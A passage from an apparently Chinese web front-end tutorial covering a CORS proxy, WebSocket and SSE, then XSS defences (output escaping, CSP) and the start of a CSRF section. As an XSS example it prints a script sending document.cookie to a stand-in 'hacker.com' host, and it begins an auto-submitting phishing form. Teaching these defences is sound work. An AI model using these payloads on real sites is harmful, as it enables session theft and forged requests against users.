<span class="token keyword">const</span> <span class="token punctuation">&#123;</span> createProxyMiddleware <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-proxy-middleware'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/external-api'</span><span class="token punctuation">,</span> <span class="token function">createProxyMiddleware</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'https://third-party.com'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token function-variable function">onProxyReq</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">proxyReq<span class="token punctuation">,</span> req</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 添加自定义请求头</span>
    proxyReq<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'X-Proxy-Source'</span><span class="token punctuation">,</span> <span class="token string">'my-server'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>方案对比与选型</strong></p>
<table>
<thead>
<tr>
<th align="left">方案</th>
<th align="left">适用场景</th>
<th align="left">安全性</th>
<th align="left">复杂度</th>
<th align="left">协议支持</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CORS</td>
<td align="left">可控的第三方API</td>
<td align="left">★★★</td>
<td align="left">★★</td>
<td align="left">全HTTP方法</td>
</tr>
<tr>
<td align="left">JSONP</td>
<td align="left">老旧浏览器兼容</td>
<td align="left">★</td>
<td align="left">★</td>
<td align="left">仅GET</td>
</tr>
<tr>
<td align="left">代理</td>
<td align="left">无法修改响应头的API</td>
<td align="left">★★★</td>
<td align="left">★★★</td>
<td align="left">全协议</td>
</tr>
</tbody></table>
<p><strong>安全风险规避</strong></p>
<ul>
<li>CORS：严格设置 Access-Control-Allow-Origin 为具体域名（禁用*）</li>
<li>JSONP：验证返回数据 + CSP防护</li>
<li>代理：限制可转发的域名防止滥用</li>
<li>所有方案均需配合HTTPS防止中间人攻击</li>
</ul>
<h2 id="2-2-实时通信"><a href="#2-2-实时通信" class="headerlink" title="2.2 实时通信"></a>2.2 实时通信</h2><h3 id="WebSocket协议（双向通信-心跳检测）"><a href="#WebSocket协议（双向通信-心跳检测）" class="headerlink" title="WebSocket协议（双向通信&#x2F;心跳检测）"></a>WebSocket协议（双向通信&#x2F;心跳检测）</h3><p><strong>双向通信机制</strong></p>
<p>基础原理：在单个TCP连接上建立全双工通信通道，实现客户端与服务器之间的持续双向数据流。</p>
<p>链接建立流程：</p>
<p>（1）HTTP握手升级：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/chat</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade</span><span class="token punctuation">:</span> <span class="token header-value">websocket          // 协议升级头</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">Upgrade</span></span>
<span class="token header"><span class="token header-name keyword">Sec-WebSocket-Key</span><span class="token punctuation">:</span> <span class="token header-value">dGhlIHNhbXBsZSBub25jZQ==  // 客户端随机密钥</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">101</span> <span class="token reason-phrase string">Switching Protocols</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade</span><span class="token punctuation">:</span> <span class="token header-value">websocket</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">Upgrade</span></span>
<span class="token header"><span class="token header-name keyword">Sec-WebSocket-Accept</span><span class="token punctuation">:</span> <span class="token header-value">s3pPLMBiTxaQ9kYGzzhZRbK+xOo=  // 服务端验证响应</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>（2）协议转换</p>
<ul>
<li>TCP连接保持打开状态</li>
<li>通信协议从HTTP切换为WebSocket（端口不变，默认80&#x2F;443）</li>
</ul>
<p>数据帧结构：</p>
<pre class="line-numbers language-none"><code class="language-none">0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length   |
|I|S|S|S|  (4)  |A|     (7)     |             (16&#x2F;64)           |
|N|V|V|V|       |S|             |   (if payload len&#x3D;&#x3D;126&#x2F;127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len &#x3D;&#x3D; 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>opcode：数据类型（1&#x3D;文本，2&#x3D;二进制）</li>
<li>Payload len：数据长度（支持分片传输）</li>
<li>Masking-key：客户端到服务端数据掩码（安全规范）</li>
</ul>
<p><strong>心跳检测（Heartbeat）</strong></p>
<p>核心目的：</p>
<ul>
<li>检测连接存活状态</li>
<li>防止中间设备（NAT&#x2F;防火墙）断开”空闲”连接</li>
</ul>
<p>实现机制：</p>
<ul>
<li>心跳包：定时发送特殊控制帧（Ping&#x2F;Pong）</li>
</ul>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 浏览器端发送Ping</span>
websocket<span class="token punctuation">.</span><span class="token function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 服务端响应Pong（自动回复）</span>
websocket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ping'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> websocket<span class="token punctuation">.</span><span class="token function">pong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>帧类型：</li>
</ul>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">方向</th>
<th align="left">载荷长度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Ping</td>
<td align="left">客户端 → 服务器</td>
<td align="left">0-125字节</td>
</tr>
<tr>
<td align="left">Pong</td>
<td align="left">服务器 → 客户端</td>
<td align="left">同Ping</td>
</tr>
</tbody></table>
<p>配置参数：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://example.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 心跳间隔（建议25-30秒，小于NAT超时时间）</span>
<span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ws<span class="token punctuation">.</span>readyState <span class="token operator">===</span> WebSocket<span class="token punctuation">.</span><span class="token constant">OPEN</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    ws<span class="token punctuation">.</span><span class="token function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 发送心跳</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">25000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>异常处理：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ws<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'close'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token number">1006</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'连接异常断开（心跳超时）'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>与传统 HTTP 对比</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">WebSocket</th>
<th align="left">HTTP轮询&#x2F;长轮询</th>
</tr>
</thead>
<tbody><tr>
<td align="left">连接方式</td>
<td align="left">1个持久TCP连接（全双工）</td>
<td align="left">多次HTTP请求（半双工）</td>
</tr>
<tr>
<td align="left">头部开销</td>
<td align="left">首次握手后仅2-14字节帧头</td>
<td align="left">每次请求完整HTTP头部</td>
</tr>
<tr>
<td align="left">延迟</td>
<td align="left">毫秒级实时推送</td>
<td align="left">数百毫秒至秒级</td>
</tr>
<tr>
<td align="left">适用场景</td>
<td align="left">聊天&#x2F;实时游戏&#x2F;金融报价</td>
<td align="left">简单通知（兼容性要求高）</td>
</tr>
</tbody></table>
<p><strong>前端开发实践</strong></p>
<p>（1）浏览器 API</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'wss://api.example.com/ws'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 监听消息</span>
ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'收到数据:'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// 发送数据</span>
ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">action</span><span class="token operator">:</span> <span class="token string">'subscribe'</span><span class="token punctuation">,</span> <span class="token literal-property property">channel</span><span class="token operator">:</span> <span class="token string">'news'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 错误处理</span>
ws<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'WebSocket错误:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（2）关键优化</p>
<ul>
<li>二进制传输</li>
</ul>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 发送ArrayBuffer提升性能</span>
<span class="token keyword">const</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>自动重连</li>
</ul>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ws<span class="token punctuation">.</span><span class="token function-variable function">onclose</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>connect<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>流量控制：监控ws.bufferedAmount避免内存溢出</li>
</ul>
<p><strong>协议限制</strong></p>
<ul>
<li>不支持HTTP&#x2F;2多路复用（需独立连接）</li>
<li>移动网络切换时需手动重连</li>
<li>旧版代理可能阻断WebSocket流量</li>
</ul>
<blockquote>
<p>现代浏览器支持率：全局 &gt; 98%（包括移动端）</p>
</blockquote>
<h3 id="Server-Sent-Events（SSE）应用场景"><a href="#Server-Sent-Events（SSE）应用场景" class="headerlink" title="Server-Sent Events（SSE）应用场景"></a>Server-Sent Events（SSE）应用场景</h3><p><strong>SSE 核心特性</strong></p>
<p>协议本质：基于 HTTP 的单向通信协议，允许服务器主动向客户端推送文本数据，保持长连接。</p>
<p>技术特点：</p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">单向通信</td>
<td align="left">仅服务端→客户端方向（对比 WebSocket 双向）</td>
</tr>
<tr>
<td align="left">HTTP 基础</td>
<td align="left">使用标准 HTTP 协议，无额外端口需求</td>
</tr>
<tr>
<td align="left">自动重连</td>
<td align="left">内置断线重连机制（客户端自动恢复连接）</td>
</tr>
<tr>
<td align="left">轻量级协议</td>
<td align="left">数据格式简单（纯文本流），协议开销小</td>
</tr>
<tr>
<td align="left">浏览器原生支持</td>
<td align="left">通过 EventSource API 实现（IE 除外）</td>
</tr>
</tbody></table>
<p><strong>技术选型对比</strong></p>
<table>
<thead>
<tr>
<th align="left">场景需求</th>
<th align="left">SSE</th>
<th align="left">WebSocket</th>
<th align="left">HTTP 轮询</th>
</tr>
</thead>
<tbody><tr>
<td align="left">服务器→客户端单向推送</td>
<td align="left">✔️ 最佳</td>
<td align="left">⚠️ 过度设计</td>
<td align="left">❌ 高延迟</td>
</tr>
<tr>
<td align="left">双向交互</td>
<td align="left">❌ 不支持</td>
<td align="left">✔️ 原生支持</td>
<td align="left">❌ 低效</td>
</tr>
<tr>
<td align="left">浏览器兼容性</td>
<td align="left">✔️ 除IE</td>
<td align="left">✔️ 广泛</td>
<td align="left">✔️ 全支持</td>
</tr>
<tr>
<td align="left">协议复杂度</td>
<td align="left">★☆☆</td>
<td align="left">★★★</td>
<td align="left">★★☆</td>
</tr>
<tr>
<td align="left">部署成本</td>
<td align="left">★☆☆</td>
<td align="left">★★☆</td>
<td align="left">★☆☆</td>
</tr>
</tbody></table>
<p><strong>最佳实践</strong></p>
<p>（1）前端实现</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> es <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventSource</span><span class="token punctuation">(</span><span class="token string">'/api/stream'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 监听自定义事件</span>
es<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'stock'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token function">renderStock</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 错误处理 + 自动重连</span>
es<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  es<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">EventSource</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（2）服务端要求</p>
<ul>
<li>响应头设置：</li>
</ul>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/event-stream</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>数据格式规范：</li>
</ul>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">event: notification  // 事件类型
id: 1678901234       // 消息ID（用于断线续传）
data: &#123;"msg":"Hello"&#125;// 数据内容（可多行）
retry: 10000         // 重连间隔（毫秒）
\n\n                 // 消息结束符（两个换行）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>不适用场景</strong></p>
<ul>
<li>需要客户端频繁上传数据（如实时游戏）→ 选 WebSocket</li>
<li>二进制数据传输（如视频流）→ 选 WebRTC&#x2F;WebSocket</li>
<li>IE 浏览器支持 → 降级为 HTTP 长轮询</li>
</ul>
<p><strong>理想适用场景</strong></p>
<ul>
<li>只读数据流</li>
<li>低频事件通知</li>
<li>简单进度更新</li>
<li>兼容标准 HTTP 基础设施</li>
</ul>
<blockquote>
<p>在 90% 的服务器推送场景中，SSE 相比 WebSocket 可减少 40% 开发量</p>
</blockquote>
<h1 id="三、网络安全"><a href="#三、网络安全" class="headerlink" title="三、网络安全"></a>三、网络安全</h1><h2 id="3-1-攻击防护"><a href="#3-1-攻击防护" class="headerlink" title="3.1 攻击防护"></a>3.1 攻击防护</h2><h3 id="XSS（跨站脚本）与防御（内容编码-CSP）"><a href="#XSS（跨站脚本）与防御（内容编码-CSP）" class="headerlink" title="XSS（跨站脚本）与防御（内容编码&#x2F;CSP）"></a>XSS（跨站脚本）与防御（内容编码&#x2F;CSP）</h3><p><strong>XSS攻击原理与分类</strong></p>
<p>定义：攻击者向网页注入恶意脚本，当用户访问时脚本在浏览器执行，窃取数据或篡改页面。</p>
<p>攻击类型：</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">注入方式</th>
<th align="left">案例场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left">存储型XSS</td>
<td align="left">恶意脚本存入数据库（如评论&#x2F;消息）</td>
<td align="left">用户浏览含攻击脚本的论坛页面</td>
</tr>
<tr>
<td align="left">反射型XSS</td>
<td align="left">脚本通过URL参数注入并即时返回</td>
<td align="left">钓鱼邮件诱导点击含恶意URL</td>
</tr>
<tr>
<td align="left">DOM型XSS</td>
<td align="left">前端JS操作DOM时注入</td>
<td align="left">innerHTML加载未过滤数据</td>
</tr>
</tbody></table>
<p>危害示例：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 窃取Cookie的恶意脚本</span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://hacker.com/steal?cookie='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>核心防御方案</strong></p>
<p>(1) 内容编码（输出转义）</p>
<p>原则：所有不可信数据输出前必须转义！</p>
<p>转义规则：</p>
<table>
<thead>
<tr>
<th align="left">输出位置</th>
<th align="left">转义方法</th>
<th align="left">代码示例（JavaScript）</th>
</tr>
</thead>
<tbody><tr>
<td align="left">HTML正文</td>
<td align="left">转义 &lt; &gt; &amp; ‘ “</td>
<td align="left">const safeStr &#x3D; str.replace(&#x2F;[&amp;&lt;&gt;”‘]&#x2F;g, m &#x3D;&gt; &amp;${htmlEscapes[m]};)</td>
</tr>
<tr>
<td align="left">HTML属性</td>
<td align="left">转义 “ ‘ 并包裹在引号中</td>
<td align="left"><code>&lt;div data-value=&quot;$&#123;escapeAttr(value)&#125;&quot;&gt;</code></td>
</tr>
<tr>
<td align="left">JavaScript</td>
<td align="left">转义 \ ‘ “ &lt; &gt; &amp; + Unicode编码</td>
<td align="left">const jsSafe &#x3D; JSON.stringify(untrustedData);</td>
</tr>
<tr>
<td align="left">URL参数</td>
<td align="left">使用encodeURIComponent()</td>
<td align="left">href&#x3D;”&#x2F;search?q&#x3D;${encodeURIComponent(input)}”</td>
</tr>
</tbody></table>
<p>现代框架自定义转义：</p>
<pre class="line-numbers language-JSX" data-language="JSX"><code class="language-JSX">&#x2F;&#x2F; React自动转义
&lt;div&gt;&#123;userInput&#125;&lt;&#x2F;div&gt;

&#x2F;&#x2F; Vue自动转义
&lt;template&gt;&#123;&#123; userInput &#125;&#125;&lt;&#x2F;template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(2) 内容安全策略（CSP）</p>
<p>原理：通过HTTP头定义可信资源白名单，阻止非法脚本执行。</p>
<p>关键指令：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Security-Policy</span><span class="token punctuation">:</span> <span class="token header-value csp languages-csp">
  default-src 'self';       // 默认仅允许同源
  script-src 'self' https://trusted.cdn.com;  // 脚本来源
  style-src 'self' 'nonce-abc123';  // 样式来源
  img-src *;                // 图片允许任意源
  connect-src https://api.example.com;  // 限制AJAX请求
  frame-ancestors 'none';   // 禁止嵌套
  report-uri /csp-report;   // 违规上报</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>安全增强策略：</p>
<table>
<thead>
<tr>
<th align="left">策略</th>
<th align="left">作用</th>
<th align="left">示例指令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Nonce机制</td>
<td align="left">仅允许带特定随机数的脚本执行</td>
<td align="left">script-src ‘nonce-abc123’</td>
</tr>
<tr>
<td align="left">Hash白名单</td>
<td align="left">仅允许匹配哈希值的脚本</td>
<td align="left">script-src ‘sha256-xxxxx’</td>
</tr>
<tr>
<td align="left">严格动态</td>
<td align="left">禁止动态创建脚本（eval()&#x2F;setTimeout）</td>
<td align="left">‘strict-dynamic’</td>
</tr>
</tbody></table>
<p><strong>防御体系分层设计</strong></p>
<table>
<thead>
<tr>
<th align="left">层级</th>
<th align="left">防御措施</th>
<th align="left">有效性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">输入层</td>
<td align="left">输入验证 + 过滤</td>
<td align="left">★★☆</td>
</tr>
<tr>
<td align="left">输出层</td>
<td align="left">内容编码（核心防线）</td>
<td align="left">★★★</td>
</tr>
<tr>
<td align="left">传输层</td>
<td align="left">HTTPS防止窃听</td>
<td align="left">★★☆</td>
</tr>
<tr>
<td align="left">协议层</td>
<td align="left">CSP（终极防护）</td>
<td align="left">★★★</td>
</tr>
<tr>
<td align="left">后置防护</td>
<td align="left">Cookie设置HttpOnly</td>
<td align="left">★★☆</td>
</tr>
</tbody></table>
<p><strong>实战代码示例</strong></p>
<p>(1) HTML 代码转义</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">escapeHTML</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token punctuation">&#123;</span> 
    <span class="token string-property property">'&amp;'</span><span class="token operator">:</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">,</span> 
    <span class="token string-property property">'&lt;'</span><span class="token operator">:</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">,</span> 
    <span class="token string-property property">'>'</span><span class="token operator">:</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">,</span>
    <span class="token string-property property">'"'</span><span class="token operator">:</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">,</span> 
    <span class="token string-property property">"'"</span><span class="token operator">:</span> <span class="token string">'&amp;#39;'</span> 
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&amp;&lt;>"']</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token parameter">m</span> <span class="token operator">=></span> map<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(2) CSP 配置（Nginx）</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">add_header</span> Content-Security-Policy <span class="token string">"default-src 'self'; 
  script-src 'self' 'unsafe-inline' https:; 
  img-src * data:; 
  style-src 'self' 'unsafe-inline'; 
  frame-ancestors 'none';"</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="CSRF（跨站请求伪造）与Token验证"><a href="#CSRF（跨站请求伪造）与Token验证" class="headerlink" title="CSRF（跨站请求伪造）与Token验证"></a>CSRF（跨站请求伪造）与Token验证</h3><p><strong>CSRF 攻击原理</strong></p>
<p>定义：攻击者诱导用户在已登录状态下访问恶意页面，该页面伪造合法请求（如转账&#x2F;改密），利用浏览器的自动Cookie发送机制完成非授权操作。</p>
<p>攻击流程：</p>
<pre><code class="mermaid">sequenceDiagram
    participant 用户
    participant 银行网站
    participant 恶意网站

    用户-&gt;&gt;银行网站: 正常登录（获得Session Cookie）
    用户-&gt;&gt;恶意网站: 访问钓鱼页面
    恶意网站-&gt;&gt;银行网站: 自动发送伪造请求（携带用户Cookie）
    银行网站-&gt;&gt;恶意网站: 执行操作（误认用户身份）</code></pre>

<p>攻击条件：</p>
<ol>
<li>用户已登录目标网站</li>
<li>网站依赖Cookie验证身份</li>
<li>用户主动访问恶意页面（含自动提交表单&#x2F;脚本）</li>
</ol>
<p>伪造请求示例：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 钓鱼页面隐藏表单 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
